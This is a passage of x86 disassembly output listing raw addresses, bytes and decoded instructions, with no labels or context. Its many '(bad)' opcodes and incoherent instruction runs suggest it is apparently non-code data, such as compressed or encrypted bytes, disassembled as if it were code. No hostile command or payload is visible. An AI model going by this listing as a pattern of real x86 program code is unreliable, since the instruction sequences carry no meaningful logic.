  40f95c:	cc                   	int3
  40f95d:	4d                   	dec    %ebp
  40f95e:	fe                   	(bad)
  40f95f:	26 39 d3             	es cmp %edx,%ebx
  40f962:	17                   	pop    %ss
  40f963:	6f                   	outsl  %ds:(%esi),(%dx)
  40f964:	ec                   	in     (%dx),%al
  40f965:	12 fe                	adc    %dh,%bh
  40f967:	2d 81 3b 39 84       	sub    $0x84393b81,%eax
  40f96c:	9c                   	pushf
  40f96d:	57                   	push   %edi
  40f96e:	bc 13 b8 ff 95       	mov    $0x95ffb813,%esp
  40f973:	f2 0f c1 1d 2c fb 35 	repnz xadd %ebx,0xc735fb2c
  40f97a:	c7 
  40f97b:	c3                   	ret
  40f97c:	15 ea 05 98 7b       	adc    $0x7b9805ea,%eax
  40f981:	e7 ba                	out    %eax,$0xba
  40f983:	f8                   	clc
  40f984:	6f                   	outsl  %ds:(%esi),(%dx)
  40f985:	22 12                	and    (%edx),%dl
  40f987:	35 2d f5 14 06       	xor    $0x614f52d,%eax
  40f98c:	1b df                	sbb    %edi,%ebx
  40f98e:	e6 26                	out    %al,$0x26
  40f990:	fb                   	sti
  40f991:	2f                   	das
  40f992:	14 b8                	adc    $0xb8,%al
  40f994:	b6 74                	mov    $0x74,%dh
  40f996:	09 8d df 6e 26 6f    	or     %ecx,0x6f266edf(%ebp)
  40f99c:	3b f7                	cmp    %edi,%esi
  40f99e:	10 4c 53 b3          	adc    %cl,-0x4d(%ebx,%edx,2)
  40f9a2:	5c                   	pop    %esp
  40f9a3:	12 39                	adc    (%ecx),%bh
  40f9a5:	94                   	xchg   %eax,%esp
  40f9a6:	a9 51 fc 4b c6       	test   $0xc64bfc51,%eax
  40f9ab:	6c                   	insb   (%dx),%es:(%edi)
  40f9ac:	0f c9                	bswap  %ecx
  40f9ae:	13 b8 de bc 1e 83    	adc    -0x7ce14322(%eax),%edi
  40f9b4:	ba cc 9d a2 a4       	mov    $0xa4a29dcc,%edx
  40f9b9:	22 35 02 9b 5f 92    	and    0x925f9b02,%dh
  40f9bf:	77 ae                	ja     0x40f96f
  40f9c1:	92                   	xchg   %eax,%edx
  40f9c2:	12 35 fc c9 86 d6    	adc    0xd686c9fc,%dh
  40f9c8:	13 b8 99 3b 81 e2    	adc    -0x1d7ec467(%eax),%edi
  40f9ce:	91                   	xchg   %eax,%ecx
  40f9cf:	3a 64 be da          	cmp    -0x26(%esi,%edi,4),%ah
  40f9d3:	22 35 e8 ce 35 3c    	and    0x3c35cee8,%dh
  40f9d9:	d3 fd                	sar    %cl,%ebp
  40f9db:	08 4b c8             	or     %cl,-0x38(%ebx)
  40f9de:	12 35 4f 8b 8b b3    	adc    0xb38b8b4f,%dh
  40f9e4:	e0 5f                	loopne 0x40fa45
  40f9e6:	92                   	xchg   %eax,%edx
  40f9e7:	2d 13 b8 7d 30       	sub    $0x307db813,%eax
  40f9ec:	d5 76                	aad    $0x76
  40f9ee:	dd 87 19 aa 10 55    	fldl   0x5510aa19(%edi)
  40f9f4:	db d3                	fcmovnbe %st(3),%st
  40f9f6:	dd 17                	fstl   (%edi)
  40f9f8:	35 fe 2f 09 c0       	xor    $0xc0092ffe,%eax
  40f9fd:	27                   	daa
  40f9fe:	ea ae da f2 13 49 7a 	ljmp   $0x7a49,$0x13f2daae
  40fa05:	83 f4 b8             	xor    $0xffffffb8,%esp
  40fa08:	56                   	push   %esi
  40fa09:	73 2d                	jae    0x40fa38
  40fa0b:	35 46 35 35 12       	xor    $0x12353546,%eax
  40fa10:	de b9 8f 17 5d 34    	fidivrs 0x345d178f(%ecx)
  40fa16:	12 6b 73             	adc    0x73(%ebx),%ch
  40fa19:	4a                   	dec    %edx
  40fa1a:	1f                   	pop    %ds
  40fa1b:	41                   	inc    %ecx
  40fa1c:	b7 cc                	mov    $0xcc,%bh
  40fa1e:	9d                   	popf
  40fa1f:	f0 5f                	lock pop %edi
  40fa21:	13 b8 41 b3 2b 0e    	adc    0xe2bb341(%eax),%edi
  40fa27:	b7 7c                	mov    $0x7c,%bh
  40fa29:	22 a1 79 e7 3e ba    	and    -0x45c11887(%ecx),%ah
  40fa2f:	eb 09                	jmp    0x40fa3a
  40fa31:	6a 12                	push   $0x12
  40fa33:	35 cb 99 1f ae       	xor    $0xae1f99cb,%eax
  40fa38:	15 a4 fe 25 13       	adc    $0x1325fea4,%eax
  40fa3d:	b8 73 34 4e 55       	mov    $0x554e3473,%eax
  40fa42:	48                   	dec    %eax
  40fa43:	c5 b0 43 f7 a1 7a    	lds    0x7aa1f743(%eax),%esi
  40fa49:	7f 4b                	jg     0x40fa96
  40fa4b:	f8                   	clc
  40fa4c:	d9 a0 35 3d 25 93    	fldenv -0x6cdac2cb(%eax)
  40fa52:	ca 7d 14             	lret   $0x147d
  40fa55:	b8 f5 ea 92 b9       	mov    $0xb992eaf5,%eax
  40fa5a:	49                   	dec    %ecx
  40fa5b:	8a 39                	mov    (%ecx),%bh
  40fa5d:	46                   	inc    %esi
  40fa5e:	ed                   	in     (%dx),%eax
  40fa5f:	26 6f                	outsl  %es:(%esi),(%dx)
  40fa61:	ec                   	in     (%dx),%al
  40fa62:	9d                   	popf
  40fa63:	1b 0b                	sbb    (%ebx),%ecx
  40fa65:	e2 da                	loop   0x40fa41
  40fa67:	12 6f 4a             	adc    0x4a(%edi),%ch
  40fa6a:	43                   	inc    %ebx
  40fa6b:	d8 cd                	fmul   %st(5),%st
  40fa6d:	39 ee                	cmp    %ebp,%esi
  40fa6f:	24 fc                	and    $0xfc,%al
  40fa71:	b7 14                	mov    $0x14,%bh
  40fa73:	b8 45 11 f8 91       	mov    $0x91f81145,%eax
  40fa78:	b7 26                	mov    $0x26,%bh
  40fa7a:	c9                   	leave
  40fa7b:	1d de b9 ef 61       	sbb    $0x61efb9de,%eax
  40fa80:	73 d3                	jae    0x40fa55
  40fa82:	d7                   	xlat   %ds:(%ebx)
  40fa83:	df 14 12             	fists  (%edx,%edx,1)
  40fa86:	39 dd                	cmp    %ebx,%ebp
  40fa88:	aa                   	stos   %al,%es:(%edi)
  40fa89:	f5                   	cmc
  40fa8a:	72 dc                	jb     0x40fa68
  40fa8c:	d9 7f c9             	fnstcw -0x37(%edi)
  40fa8f:	a9 13 b8 8e 8e       	test   $0x8e8eb813,%eax
  40fa94:	24 13                	and    $0x13,%al
  40fa96:	df 5c 22 ef          	fistps -0x11(%edx,%eiz,1)
  40fa9a:	dc c3                	fadd   %st,%st(3)
  40fa9c:	c9                   	leave
  40fa9d:	6f                   	outsl  %ds:(%esi),(%dx)
  40fa9e:	53                   	push   %ebx
  40fa9f:	05 b7 4a 12 35       	add    $0x35124ab7,%eax
  40faa4:	c3                   	ret
  40faa5:	28 ed                	sub    %ch,%ch
  40faa7:	2c 06                	sub    $0x6,%al
  40faa9:	f1                   	int1
  40faaa:	2f                   	das
  40faab:	09 b7 13 b8 94 cf    	or     %esi,-0x306b47ed(%edi)
  40fab1:	67 35 5f d5 32 77    	addr16 xor $0x7732d55f,%eax
  40fab7:	92                   	xchg   %eax,%edx
  40fab8:	22 35 af 80 ff 92    	and    0x92ff80af,%dh
  40fabe:	bd 73 12 35 34       	mov    $0x34351273,%ebp
  40fac3:	70 bf                	jo     0x40fa84
  40fac5:	38 6b 13             	cmp    %ch,0x13(%ebx)
  40fac8:	b8 77 70 25 c3       	mov    $0xc3257077,%eax
  40facd:	93                   	xchg   %eax,%ebx
  40face:	b9 b3 99 6b c8       	mov    $0xc86b99b3,%ecx
  40fad3:	22 35 d3 71 28 b7    	and    0xb72871d3,%dh
  40fad9:	bf 24 ef 5c b6       	mov    $0xb65cef24,%edi
  40fade:	12 35 9c 59 24 30    	adc    0x3024599c,%dh
  40fae4:	13 b8 4d 9c cc 0d    	adc    0xdcc9c4d(%eax),%edi
  40faea:	c2 7e d0             	ret    $0xd07e
  40faed:	ed                   	in     (%dx),%eax
  40faee:	ff 22                	jmp    *(%edx)
  40faf0:	35 6c cc 19 bc       	xor    $0xbc19cc6c,%eax
  40faf5:	73 1f                	jae    0x40fb16
  40faf7:	47                   	inc    %edi
  40faf8:	ec                   	in     (%dx),%al
  40faf9:	12 35 89 18 f8 a1    	adc    0xa1f81889,%dh
  40faff:	46                   	inc    %esi
  40fb00:	4c                   	dec    %esp
  40fb01:	16                   	push   %ss
  40fb02:	f0 6f                	lock outsl %ds:(%esi),(%dx)
  40fb04:	14 b8                	adc    $0xb8,%al
  40fb06:	67 01 75 1a          	add    %esi,0x1a(%di)
  40fb0a:	39 e7                	cmp    %esp,%edi
  40fb0c:	fe 43 38             	incb   0x38(%ebx)
  40fb0f:	69 11 24 fd 2f 57    	imul   $0x572ffd24,(%ecx),%edx
  40fb15:	87 05 26 12 39 ff    	xchg   %eax,0xff391226
  40fb1b:	82 64 78 92 38       	andb   $0x38,-0x6e(%eax,%edi,2)
  40fb20:	54                   	push   %esp
  40fb21:	07                   	pop    %es
  40fb22:	2d 03 14 b8 74       	sub    $0x74b81403,%eax
  40fb27:	31 4f 96             	xor    %ecx,-0x6a(%edi)
  40fb2a:	80 9b 84 22 4b 72 26 	sbbb   $0x26,0x724b2284(%ebx)
  40fb31:	cd 78                	int    $0x78
  40fb33:	e7 3e                	out    %eax,$0x3e
  40fb35:	02 cf                	add    %bh,%cl
  40fb37:	60                   	pusha
  40fb38:	12 39                	adc    (%ecx),%bh
  40fb3a:	6d                   	insl   (%dx),%es:(%edi)
  40fb3b:	e3 7f                	jecxz  0x40fbbc
  40fb3d:	69 1b a4 7f 49 15    	imul   $0x15497fa4,(%ebx),%ebx
  40fb43:	13 b8 bb 96 4e 03    	adc    0x34e96bb(%eax),%edi
  40fb49:	a9 22 1b 83 20       	test   $0x20831b22,%eax
  40fb4e:	99                   	cltd
  40fb4f:	a9 0e 96 12 5f       	test   $0x5f12960e,%eax
  40fb54:	12 e2                	adc    %dl,%ah
  40fb56:	9d                   	popf
  40fb57:	35 d0 e8 64 57       	xor    $0x5764e8d0,%eax
  40fb5c:	46                   	inc    %esi
  40fb5d:	14 b8                	adc    $0xb8,%al
  40fb5f:	e6 26                	out    %al,$0x26
  40fb61:	21 e2                	and    %esp,%edx
  40fb63:	5e                   	pop    %esi
  40fb64:	91                   	xchg   %eax,%ecx
  40fb65:	32 5a e2             	xor    -0x1e(%edx),%bl
  40fb68:	26 39 78 e7          	cmp    %edi,%es:-0x19(%eax)
  40fb6c:	be 4e d3 97 c3       	mov    $0xc397d34e,%esi
  40fb71:	d0 12                	rclb   $1,(%edx)
  40fb73:	39 9d 5e 9e 48 33    	cmp    %ebx,0x33489e5e(%ebp)
  40fb79:	82 7f 49 19          	cmpb   $0x19,0x49(%edi)
  40fb7d:	13 b8 9b cc e0 4b    	adc    0x4be0cc9b(%eax),%edi
  40fb83:	fb                   	sti
  40fb84:	1e                   	push   %ds
  40fb85:	e6 a0                	out    %al,$0xa0
  40fb87:	18 a7 df d3 4f 35    	sbb    %ah,0x354fd3df(%edi)
  40fb8d:	06                   	push   %es
  40fb8e:	12 bf 64 d4 9d 35    	adc    0x359dd464(%edi),%bh
  40fb94:	a1 21 b9 35 13       	mov    0x1335b921,%eax
  40fb99:	b8 31 27 73 27       	mov    $0x27732731,%eax
  40fb9e:	c1 53 3a ad          	rcll   $0xad,0x3a(%ebx)
  40fba2:	4e                   	dec    %esi
  40fba3:	22 db                	and    %bl,%bl
  40fba5:	a3 f8 64 ef dc       	mov    %eax,0xdcef64f8
  40fbaa:	53                   	push   %ebx
  40fbab:	c9                   	leave
  40fbac:	3c 12                	cmp    $0x12,%al
  40fbae:	35 32 c9 1b d1       	xor    $0xd11bc932,%eax
  40fbb3:	db dc                	fcmovnu %st(4),%st
  40fbb5:	19 d4                	sbb    %edx,%esp
  40fbb7:	bf 13 b8 b5 6b       	mov    $0x6bb5b813,%edi
  40fbbc:	7b 22                	jnp    0x40fbe0
  40fbbe:	85 22                	test   %esp,(%edx)
  40fbc0:	bd 73 67 c9 35       	mov    $0x35c96773,%ebp
  40fbc5:	db 72 12             	(bad) 0x12(%edx)
  40fbc8:	35 e8 11 8e 1b       	xor    $0x1b8e11e8,%eax
  40fbcd:	9b                   	fwait
  40fbce:	84 ff                	test   %bh,%bh
  40fbd0:	96                   	xchg   %eax,%esi
  40fbd1:	db 14 b8             	fistl  (%eax,%edi,4)
  40fbd4:	e0 8f                	loopne 0x40fb65
  40fbd6:	9b                   	fwait
  40fbd7:	1a 4b be             	sbb    -0x42(%ebx),%cl
  40fbda:	26 9d                	es popf
  40fbdc:	6b 78 99 db          	imul   $0xffffffdb,-0x67(%eax),%edi
  40fbe0:	b5 2d                	mov    $0x2d,%ch
  40fbe2:	f5                   	cmc
  40fbe3:	ac                   	lods   %ds:(%esi),%al
  40fbe4:	12 39                	adc    (%ecx),%bh
  40fbe6:	77 0a                	ja     0x40fbf2
  40fbe8:	f8                   	clc
  40fbe9:	97                   	xchg   %eax,%edi
  40fbea:	ec                   	in     (%dx),%al
  40fbeb:	77 88                	ja     0x40fb75
  40fbed:	52                   	push   %edx
  40fbee:	db 13                	fistl  (%ebx)
  40fbf0:	b8 41 a9 06 0d       	mov    $0xd06a941,%eax
  40fbf5:	4f                   	dec    %edi
  40fbf6:	e6 ce                	out    %al,$0xce
  40fbf8:	1b f5                	sbb    %ebp,%esi
  40fbfa:	22 35 ea 15 30 bb    	and    0xbb3015ea,%dh
  40fc00:	e2 21                	loop   0x40fc23
  40fc02:	07                   	pop    %es
  40fc03:	b4 73                	mov    $0x73,%ah
  40fc05:	12 35 23 d7 07 93    	adc    0x9307d723,%dh
  40fc0b:	e1 64                	loope  0x40fc71
  40fc0d:	ff 0d 14 b8 62 de    	decl   0xde62b814
  40fc13:	30 dc                	xor    %bl,%ah
  40fc15:	6f                   	outsl  %ds:(%esi),(%dx)
  40fc16:	2e cc                	cs int3
  40fc18:	d9 73 5f             	fnstenv 0x5f(%ebx)
  40fc1b:	4c                   	dec    %esp
  40fc1c:	82 15 56 e8 1c 12 39 	adcb   $0x39,0x121ce856
  40fc23:	fa                   	cli
  40fc24:	97                   	xchg   %eax,%edi
  40fc25:	2c b8                	sub    $0xb8,%al
  40fc27:	41                   	inc    %ecx
  40fc28:	98                   	cwtl
  40fc29:	b2 1d                	mov    $0x1d,%dl
  40fc2b:	13 b8 8c b0 39 2c    	adc    0x2c39b08c(%eax),%edi
  40fc31:	99                   	cltd
  40fc32:	3b 01                	cmp    (%ecx),%eax
  40fc34:	3a 65 22             	cmp    0x22(%ebp),%ah
  40fc37:	6f                   	outsl  %ds:(%esi),(%dx)
  40fc38:	df df                	(bad)
  40fc3a:	b2 77                	mov    $0x77,%dl
  40fc3c:	ee                   	out    %al,(%dx)
  40fc3d:	52                   	push   %edx
  40fc3e:	12 35 5d 06 0f 5a    	adc    0x5a0f065d,%dh
  40fc44:	df 14 b8             	fists  (%eax,%edi,4)
  40fc47:	99                   	cltd
  40fc48:	9b                   	fwait
  40fc49:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40fc4a:	e8 87 db 53 4c       	call   0x4c94d7d6
  40fc4f:	9f                   	lahf
  40fc50:	26 39 9d eb 28 38 ea 	cmp    %ebx,%es:-0x15c7d715(%ebp)
  40fc57:	f5                   	cmc
  40fc58:	bf 8c 12 39 26       	mov    $0x2639128c,%edi
  40fc5d:	fb                   	sti
  40fc5e:	2f                   	das
  40fc5f:	18 ee                	sbb    %ch,%dh
  40fc61:	fd                   	std
  40fc62:	1e                   	push   %ds
  40fc63:	7a 8b                	jp     0x40fbf0
  40fc65:	65 14 b8             	gs adc $0xb8,%al
  40fc68:	96                   	xchg   %eax,%esi
  40fc69:	88 b2 e6 a9 53 03    	mov    %dh,0x353a9e6(%edx)
  40fc6f:	e6 26                	out    %al,$0x26
  40fc71:	d9 26                	fldenv (%esi)
  40fc73:	39 63 26             	cmp    %esp,0x26(%ebx)
  40fc76:	bf 25 ef 5c c6       	mov    $0xc65cef25,%edi
  40fc7b:	12 39                	adc    (%ecx),%bh
  40fc7d:	2b 7e 97             	sub    -0x69(%esi),%edi
  40fc80:	46                   	inc    %esi
  40fc81:	14 b8                	adc    $0xb8,%al
  40fc83:	21 7b 4d             	and    %edi,0x4d(%ebx)
  40fc86:	42                   	inc    %edx
  40fc87:	c0 13 2b             	rclb   $0x2b,(%ebx)
  40fc8a:	7b 13                	jnp    0x40fc9f
  40fc8c:	09 e3                	or     %esp,%ebx
  40fc8e:	bc 73 27 0c 1d       	mov    $0x1d0c2773,%esp
  40fc93:	00 12                	add    %dl,(%edx)
  40fc95:	39 fe                	cmp    %edi,%esi
  40fc97:	fd                   	std
  40fc98:	9e                   	sahf
  40fc99:	4c                   	dec    %esp
  40fc9a:	6e                   	outsb  %ds:(%esi),(%dx)
  40fc9b:	b2 ff                	mov    $0xff,%dl
  40fc9d:	96                   	xchg   %eax,%esi
  40fc9e:	14 b8                	adc    $0xb8,%al
  40fca0:	86 e9                	xchg   %ch,%cl
  40fca2:	0d 26 73 4c 26       	or     $0x264c7326,%eax
  40fca7:	3b d7                	cmp    %edi,%edx
  40fca9:	f0 64 73 d3          	lock fs jae 0x40fc80
  40fcad:	c7                   	(bad)
  40fcae:	26 8d 3a             	lea    %es:(%edx),%edi
  40fcb1:	12 39                	adc    (%ecx),%bh
  40fcb3:	cd a0                	int    $0xa0
  40fcb5:	f8                   	clc
  40fcb6:	97                   	xchg   %eax,%edi
  40fcb7:	0c 88                	or     $0x88,%al
  40fcb9:	78 8b                	js     0x40fc46
  40fcbb:	13 b8 69 14 ff 3d    	adc    0x3dff1469(%eax),%edi
  40fcc1:	99                   	cltd
  40fcc2:	3b ab 5c 84 22 35    	cmp    0x3522845c(%ebx),%ebp
  40fcc8:	b2 26                	mov    $0x26,%dl
  40fcca:	c4 08                	les    (%eax),%ecx
  40fccc:	bd 73 0d cb 70       	mov    $0x70cb0d73,%ebp
  40fcd1:	12 35 90 6c 99 41    	adc    0x41996c90,%dh
  40fcd7:	90                   	nop
  40fcd8:	9b                   	fwait
  40fcd9:	84 fe                	test   %bh,%dh
  40fcdb:	0b 15 b8 1f 0d 90    	or     0x900d1fb8,%edx
  40fce1:	94                   	xchg   %eax,%esp
  40fce2:	90                   	nop
  40fce3:	bd 27 ef dc 3f       	mov    $0x3fdcef27,%ebp
  40fce8:	99                   	cltd
  40fce9:	3a 6b 5c             	cmp    0x5c(%ebx),%ch
  40fcec:	f0 fe 87 05 ab 12 3a 	lock incb 0x3a12ab05(%edi)
  40fcf3:	bf b9 07 5c fa       	mov    $0xfa5c07b9,%edi
  40fcf8:	6f                   	outsl  %ds:(%esi),(%dx)
  40fcf9:	48                   	dec    %eax
  40fcfa:	05 a2 13 b8 61       	add    $0x61b813a2,%eax
  40fcff:	e4 15                	in     $0x15,%al
  40fd01:	3e 4e                	ds dec %esi
  40fd03:	48                   	dec    %eax
  40fd04:	e6 ce                	out    %al,$0xce
  40fd06:	2a f4                	sub    %ah,%dh
  40fd08:	22 35 8e e1 7f 4b    	and    0x4b7fe18e,%dh
  40fd0e:	78 e7                	js     0x40fcf7
  40fd10:	12 35 4c 42 9f c1    	adc    0xc19f424c,%dh
  40fd16:	8e 14 b8             	mov    (%eax,%edi,4),%ss
  40fd19:	32 bc 60 80 49 a0 69 	xor    0x69a04980(%eax,%eiz,2),%bh
  40fd20:	79 2d                	jns    0x40fd4f
  40fd22:	09 b9 11 0a 86 1a    	or     %edi,0x1a860a11(%ecx)
  40fd28:	59                   	pop    %ecx
  40fd29:	1b 12                	sbb    (%edx),%edx
  40fd2b:	bf 64 51 dc 39       	mov    $0x39dc5164,%edi
  40fd30:	bd f7 d7 c7 13       	mov    $0x13c7d7f7,%ebp
  40fd35:	b8 64 f0 64 ee       	mov    $0xee64f064,%eax
  40fd3a:	ec                   	in     (%dx),%al
  40fd3b:	e1 38                	loope  0x40fd75
  40fd3d:	fe                   	(bad)
  40fd3e:	6f                   	outsl  %ds:(%esi),(%dx)
  40fd3f:	63 22                	arpl   %esp,(%edx)
  40fd41:	6f                   	outsl  %ds:(%esi),(%dx)
  40fd42:	d3 10                	rcll   %cl,(%eax)
  40fd44:	2b 4b c6             	sub    -0x3a(%ebx),%ecx
  40fd47:	3b d7                	cmp    %edi,%edx
  40fd49:	16                   	push   %ss
  40fd4a:	51                   	push   %ecx
  40fd4b:	12 35 38 65 6f d1    	adc    0xd16f6538,%dh
  40fd51:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40fd52:	13 93 e4 ce fe b8    	adc    -0x4701311c(%ebx),%edx
  40fd58:	d8 cb                	fmul   %st(3),%st
  40fd5a:	2b 92 35 99 22 14    	sub    0x14229935(%edx),%edx
  40fd60:	a9 8a 3b f7 01       	test   $0x1f73b8a,%eax
  40fd65:	01 87 12 35 69 98    	add    %eax,-0x6796caee(%edi)
  40fd6b:	f5                   	cmc
  40fd6c:	9d                   	popf
  40fd6d:	fd                   	std
  40fd6e:	97                   	xchg   %eax,%edi
  40fd6f:	04 b7                	add    $0xb7,%al
  40fd71:	13 b8 1f 11 7c e3    	adc    -0x1c83eee1(%eax),%edi
  40fd77:	35 cf b9 8e 9e       	xor    $0x9e8eb9cf,%eax
  40fd7c:	cc                   	int3
  40fd7d:	22 6b 53             	and    0x53(%ebx),%ch
  40fd80:	f9                   	stc
  40fd81:	f1                   	int1
  40fd82:	a2 bd 12 f6 5f       	mov    %al,0x5ff612bd
  40fd87:	92                   	xchg   %eax,%edx
  40fd88:	de 35 85 c6 67 c4    	fidivs 0xc467c685
  40fd8e:	80 13 b8             	adcb   $0xb8,(%ebx)
  40fd91:	34 c0                	xor    $0xc0,%al
  40fd93:	25 4b 35 eb 4e       	and    $0x4eeb354b,%eax
  40fd98:	66 78 05             	data16 js 0x40fda0
  40fd9b:	cf                   	iret
  40fd9c:	d6                   	salc
  40fd9d:	d7                   	xlat   %ds:(%ebx)
  40fd9e:	28 c1                	sub    %al,%cl
  40fda0:	a1 f3 35 5f 92       	mov    0x925f35f3,%eax
  40fda5:	2a 3e                	sub    (%esi),%bh
  40fda7:	29 5d 95             	sub    %ebx,-0x6b(%ebp)
  40fdaa:	6b 13 b8             	imul   $0xffffffb8,(%ebx),%edx
  40fdad:	0f ec a4 e0 9c 39 20 	paddsb 0x2e20399c(%eax,%eiz,8),%mm4
  40fdb4:	2e 
  40fdb5:	3b 35 d3 0e 82 3b    	cmp    0x3b820ed3,%esi
  40fdbb:	d7                   	xlat   %ds:(%ebx)
  40fdbc:	40                   	inc    %eax
  40fdbd:	2b 29                	sub    (%ecx),%ebp
  40fdbf:	12 6b 7f             	adc    0x7f(%ebx),%ch
  40fdc2:	65 e2 0c             	gs loop 0x40fdd1
  40fdc5:	a0 7f 49 80 13       	mov    0x1380497f,%al
  40fdca:	b8 bd ce 00 d7       	mov    $0xd700cebd,%eax
  40fdcf:	9a e2 64 ee 71 22 a1 	lcall  $0xa122,$0x71ee64e2
  40fdd6:	8e 50 96             	mov    -0x6a(%eax),%ss
  40fdd9:	5f                   	pop    %edi
  40fdda:	e0 25                	loopne 0x40fe01
  40fddc:	7b e7                	jnp    0x40fdc5
  40fdde:	12 35 c8 e0 2f e9    	adc    0xe92fe0c8,%dh
  40fde4:	a1 13 4e e6 2e       	mov    0x2ee64e13,%eax
  40fde9:	a1 1b a7 22 35       	mov    0x3522a71b,%eax
  40fdee:	6e                   	outsb  %ds:(%esi),(%dx)
  40fdef:	5c                   	pop    %esp
  40fdf0:	c4 9d eb a2 4b 95    	les    -0x6ab45d15(%ebp),%ebx
  40fdf6:	12 35 5b 58 b1 02    	adc    0x2b1585b,%dh
  40fdfc:	fc                   	cld
  40fdfd:	4b                   	dec    %ebx
  40fdfe:	56                   	push   %esi
  40fdff:	6b 13 b8             	imul   $0xffffffb8,(%ebx),%edx
  40fe02:	77 8c                	ja     0x40fd90
  40fe04:	41                   	inc    %ecx
  40fe05:	0c b9                	or     $0xb9,%al
  40fe07:	7f 32                	jg     0x40fe3b
  40fe09:	77 de                	ja     0x40fde9
  40fe0b:	22 35 fa 63 48 42    	and    0x424863fa,%dh
  40fe11:	87 05 cb 12 f1 df    	xchg   %eax,0xdff112cb
  40fe17:	12 de                	adc    %dh,%bl
  40fe19:	35 24 76 72 13       	xor    $0x13727624,%eax
  40fe1e:	e9 14 b8 d5 77       	jmp    0x7816b637
  40fe23:	f3 c7                	repz (bad)
  40fe25:	4d                   	dec    %ebp
  40fe26:	12 86 93 ca 17 d0    	adc    -0x2fe8356d(%esi),%al
  40fe2c:	11 d0                	adc    %edx,%eax
  40fe2e:	16                   	push   %ss
  40fe2f:	92                   	xchg   %eax,%edx
  40fe30:	f0 ce                	lock into
  40fe32:	3d e8 05 12 39       	cmp    $0x391205e8,%eax
  40fe37:	16                   	push   %ss
  40fe38:	60                   	pusha
  40fe39:	a2 25 b3 b9 20       	mov    %al,0x20b9b325
  40fe3e:	44                   	inc    %esp
  40fe3f:	ff 13                	call   *(%ebx)
  40fe41:	b8 7b 1a 7d ff       	mov    $0xff7d1a7b,%eax
  40fe46:	22 de                	and    %dh,%bl
  40fe48:	b9 a7 93 6f d3       	mov    $0xd36f93a7,%ecx
  40fe4d:	e0 00                	loopne 0x40fe4f
  40fe4f:	3b 12                	cmp    (%edx),%edx
  40fe51:	35 6e 0c 55 80       	xor    $0x80550c6e,%eax
  40fe56:	13 88 7f 49 13 b8    	adc    -0x47ecb681(%eax),%ecx
  40fe5c:	a0 4a de 53 ce       	mov    0xce53de4a,%al
  40fe61:	3d 97 b9 83 22       	cmp    $0x2283b997,%eax
  40fe66:	35 aa 71 12 35       	xor    $0x351271aa,%eax
  40fe6b:	13 fe                	adc    %esi,%edi
  40fe6d:	4b                   	dec    %ebx
  40fe6e:	f2 bd 92 c8 f9 13    	repnz mov $0x13f9c892,%ebp
  40fe74:	b8 cd 1a c4 04       	mov    $0x4c41acd,%eax
  40fe79:	b3 b9                	mov    $0xb9,%bl
  40fe7b:	86 97 b9 b9 22 35    	xchg   %dl,0x3522b9b9(%edi)
  40fe81:	75 22                	jne    0x40fea5
  40fe83:	b3 a7                	mov    $0xa7,%bl
  40fe85:	12 44 ff 96          	adc    -0x6a(%edi,%edi,8),%al
  40fe89:	dd 35 d7 78 38 da    	fnsave 0xda3878d7
  40fe8f:	13 b8 86 85 86 27    	adc    0x27868586(%eax),%edi
  40fe95:	25 73 27 fb f0       	and    $0xf0fb2773,%eax
  40fe9a:	22 35 dc dd 05 cb    	and    0xcb05dddc,%dh
  40fea0:	bd 73 12 35 2e       	mov    $0x2e351273,%ebp
  40fea5:	07                   	pop    %es
  40fea6:	88 d4                	mov    %dl,%ah
  40fea8:	f3 50                	repz push %eax
  40feaa:	77 92                	ja     0x40fe3e
  40feac:	08 fe                	or     %bh,%dh
  40feae:	14 b8                	adc    $0xb8,%al
  40feb0:	b8 18 0a 56 29       	mov    $0x29560a18,%eax
  40feb5:	d1 1d 3b f7 3d 0c    	rcrl   $1,0xc3df73b
  40febb:	23 d3                	and    %ebx,%edx
  40febd:	bf 6f 17 12 39       	mov    $0x3912176f,%edi
  40fec2:	d7                   	xlat   %ds:(%ebx)
  40fec3:	8f 09 f0 2f          	(bad)
  40fec7:	d9 d9                	(bad)
  40fec9:	da a5 13 b8 25 40    	fisubl 0x4025b813(%ebp)
  40fecf:	b9 e3 77 52 32       	mov    $0x325277e3,%ecx
  40fed4:	dc 61 22             	fsubl  0x22(%ecx)
  40fed7:	c5 dc 4d             	(bad)
  40feda:	12 ff                	adc    %bh,%bh
  40fedc:	02 d2                	add    %dl,%dl
  40fede:	3b 35 3a ef 37 16    	cmp    0x1637ef3a,%esi
  40fee4:	dc 15 b8 2d df ce    	fcoml  0xcedf2db8
  40feea:	cb                   	lret
  40feeb:	dc 24 05 4b 9b 27 aa 	fsubl  -0x55d864b5(,%eax,1)
  40fef2:	54                   	push   %esp
  40fef3:	ec                   	in     (%dx),%al
  40fef4:	5c                   	pop    %esp
  40fef5:	d7                   	xlat   %ds:(%ebx)
  40fef6:	f5                   	cmc
  40fef7:	67 c1 88 12 3a eb    	rorl   $0xeb,0x3a12(%bx,%si)
  40fefd:	e2 e0                	loop   0x40fedf
  40feff:	df 10                	fists  (%eax)
  40ff01:	30 91 a5 14 b8 07    	xor    %dl,0x7b814a5(%ecx)
  40ff07:	ab                   	stos   %eax,%es:(%edi)
  40ff08:	fb                   	sti
  40ff09:	86 64 6e b2          	xchg   %ah,-0x4e(%esi,%ebp,2)
  40ff0d:	cc                   	int3
  40ff0e:	d5 26                	aad    $0x26
  40ff10:	39 f6                	cmp    %esi,%esi
  40ff12:	5b                   	pop    %ebx
  40ff13:	c2 3b f7             	ret    $0xf73b
  40ff16:	40                   	inc    %eax
  40ff17:	87 05 c2 12 39 f7    	xchg   %eax,0xf73912c2
  40ff1d:	2b b5 52 1b 14 99    	sub    -0x66ebe4ae(%ebp),%esi
  40ff23:	62 12                	bound  %edx,(%edx)
  40ff25:	fe                   	(bad)
  40ff26:	b8 1b 41 af 72       	mov    $0x72af411b,%eax
  40ff2b:	f6 0e 49             	testb  $0x49,(%esi)
  40ff2e:	f6 b3 86 93 e4 f8    	divb   -0x71b6c7a(%ebx)
  40ff34:	1f                   	pop    %ds
  40ff35:	54                   	push   %esp
  40ff36:	fc                   	cld
  40ff37:	39 82 c1 6e 55 e4    	cmp    %eax,-0x1baa913f(%edx)
  40ff3d:	36 08 fd             	ss or  %bh,%ch
  40ff40:	4b                   	dec    %ebx
  40ff41:	13 b8 a9 63 06 91    	adc    -0x6ef99c57(%eax),%edi
  40ff47:	45                   	inc    %ebp
  40ff48:	35 dc b9 13 06       	xor    $0x613b9dc,%eax
  40ff4d:	54                   	push   %esp
  40ff4e:	32 12                	xor    (%edx),%dl
